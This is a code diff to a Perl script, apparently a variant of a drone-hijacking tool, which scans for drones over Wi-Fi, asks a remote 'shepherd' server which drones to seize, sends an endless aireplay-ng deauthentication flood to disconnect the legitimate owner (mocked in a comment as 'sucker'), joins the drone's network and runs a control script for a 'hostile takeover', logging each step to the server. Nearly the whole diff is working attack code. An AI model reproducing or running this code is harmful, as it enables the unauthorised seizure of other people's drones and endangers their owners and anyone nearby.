@@ -53,7 +53,7 @@ my $airmon	= "airmon-ng";
 my $aireplay	= "aireplay-ng";
 my $aircrack	= "aircrack-ng";
 my $airodump	= "airodump-ng";
-my $nodejs	= "nodejs";
+my $nodejs	= "node";
 
 
 # put device into monitor mode
@@ -65,8 +65,8 @@ my $tmpfile = "/tmp/dronestrike";
 my %skyjacked;
 
 ### GROUND STATION STARTED LOG ###
-# my $data = '{"event":"ground_station_started"}';
-# $client->POST($shepherd_app_url . $logs_path, $data);
+my $data = '{"event":"ground_station_started"}';
+$client->POST($shepherd_app_url . $logs_path, $data);
 
 while (1)
 {
@@ -113,8 +113,8 @@ while (1)
 							$chans{$1} = [$2, $3];
 
 							### DRONE DETECTED LOG ###
-							# my $data = '{"event":"detected", "drone_mac_address":"'. $1 .'"}';
-							# $client->POST($shepherd_app_url . $logs_path, $data);
+							my $data = '{"event":"detected", "drone_mac_address":"'. $1 .'"}';
+							$client->POST($shepherd_app_url . $logs_path, $data);
 						}
 
 						# grab our drone MAC and owner MAC
@@ -131,61 +131,93 @@ while (1)
 		}
 		print "\n\n";
 
-		foreach my $cli (keys %clients)
-		{
-			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
+		my $cli_size = keys %clients;
+		my $drone_and_client = 0;
+		my $drone_with_client_mac = "";
 
+		if ($cli_size > 0){
+			foreach my $cli (keys %clients){	
+				print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
 
-			# hop onto the channel of the ap
-			print "Jumping onto drone's channel $chans{$clients{$cli}}[0]\n\n";
-			#sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
-			sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);
+				# Check if the client found belongs to a drone that must be hacked
+				print "Check if we should hack $clients{$cli}"
+				$client->GET($shepherd_app_url . $drones_path . $clients{$cli}, $headers);
+				my $json_res = from_json($client->responseContent());
 
-			sleep(1);
+				if ($json_res->{'take_control'}){
+					# hop onto the channel of the ap
+					print "Jumping onto drone's channel $chans{$clients{$cli}}[0]\n\n";
+					#sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
+					sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);
 
-			# now, disconnect the TRUE owner of the drone.
-			# sucker.
-			print "Disconnecting the true owner of the drone ;)\n\n";
-			sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, $interface); # TODO
-			#sudo($aireplay, "-0", "3", "-a", $clients{$cli}, $interface);
+					sleep(1);
 
+					# now, disconnect the TRUE owner of the drone.
+					# sucker.
+					print "Disconnecting the true owner of the drone \n\n";
+					sudo($aireplay, "-0", "0", "-a", $clients{$cli}, "-c", $cli, $interface, "&");
+					#sudo($aireplay, "-0", "3", "-a", $clients{$cli}, $interface);
+
+					$drone_and_client = 1;
+					$drone_with_client_mac = $clients{$cli};
+					last;
+				}
+
+				next;
+			}
 		}	
 
 		sleep(2);
 
-		# go into managed mode
-		#sudo($airmon, "stop", $interface);
+		if($drone_and_client){
+				print "\n\nConnecting to drone $chans{$drone_with_client_mac}[1] ($drone_with_client_mac)\n";
+				sudo($iwconfig, $interface2, "essid", $chans{$drone_with_client_mac}[1]);
+				#sudo($iwconfig, $interface2, "key", "open", "mode", "Managed", "essid", $chans{$drone}[1], "channel", $chans{$drone}[0]);
+				
+				#print "Acquiring IP from drone for hostile takeover\n";
+				sudo($dhclient, $interface2);
+
+				### TAKING_CONTROL LOG ###
+				my $data = '{"event":"taking_control", "drone_mac_address":"'. $drone_with_client_mac .'"}';
+				$client->POST($shepherd_app_url . $logs_path, $data);
+
+				print "\n\nTAKING OVER DRONE\n";
+				sudo($nodejs, $controljs);
+
+				### DONE LOG ###
+				my $data = '{"event":"controlled", "drone_mac_address":"'. $drone_with_client_mac .'"}';
+				$client->POST($shepherd_app_url . $logs_path, $data);
+		}
 
 		# connect to each drone and run our zombie client!
-		foreach my $drone (keys %chans)
-		{
-			# ignore drones we've skyjacked before -- thanks to @daviottenheimer for bug discovery!
-			next if $skyjacked{$chans{$drone}[1]}++;
+		# foreach my $drone (keys %chans)
+		# {
 
-			# $client->GET($shepherd_app_url . $drones_path . $chans{$drone}[1], $headers);
-			# my $json_res = from_json($client->responseContent());
+		# 	$client->GET($shepherd_app_url . $drones_path . $drone, $headers);
+		# 	my $json_res = from_json($client->responseContent());
 
-			# next if $json_res->{'take_control'};
+		# 	print $json_res->{'take_control'};
+		# 	print !($json_res->{'take_control'});
 
-			#print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
-			sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
-			#sudo($iwconfig, $interface2, "key", "open", "mode", "Managed", "essid", $chans{$drone}[1], "channel", $chans{$drone}[0]);
+		# 	#print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
+		# 	sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
+		# 	#sudo($iwconfig, $interface2, "key", "open", "mode", "Managed", "essid", $chans{$drone}[1], "channel", $chans{$drone}[0]);
 			
-			#print "Acquiring IP from drone for hostile takeover\n";
-			sudo($dhclient, $interface2);
+		# 	#print "Acquiring IP from drone for hostile takeover\n";
+		# 	sudo($dhclient, $interface2);
 
-			### TAKING_CONTROL LOG ###
-			# my $data = '{"event":"taking_control", "drone_mac_address":"'. $chans{$drone}[1] .'"}';
-			# $client->POST($shepherd_app_url . $logs_path, $data);
+		# 	### TAKING_CONTROL LOG ###
+		# 	my $data = '{"event":"taking_control", "drone_mac_address":"'. $drone .'"}';
+		# 	$client->POST($shepherd_app_url . $logs_path, $data);
 
-			print "\n\nTAKING OVER DRONE\n";
-			sudo($nodejs, $controljs);
+		# 	print "\n\nTAKING OVER DRONE\n";
+		# 	sudo($nodejs, $controljs);
 
-			### DONE LOG ###
-			# my $data = '{"event":"controlled", "drone_mac_address":"'. $chans{$drone}[1] .'"}';
-			# $client->POST($shepherd_app_url . $logs_path, $data);
+		# 	### DONE LOG ###
+		# 	my $data = '{"event":"controlled", "drone_mac_address":"'. $drone .'"}';
+		# 	$client->POST($shepherd_app_url . $logs_path, $data);
 				
-		}
+		# }
 
 	sleep 2;
 }
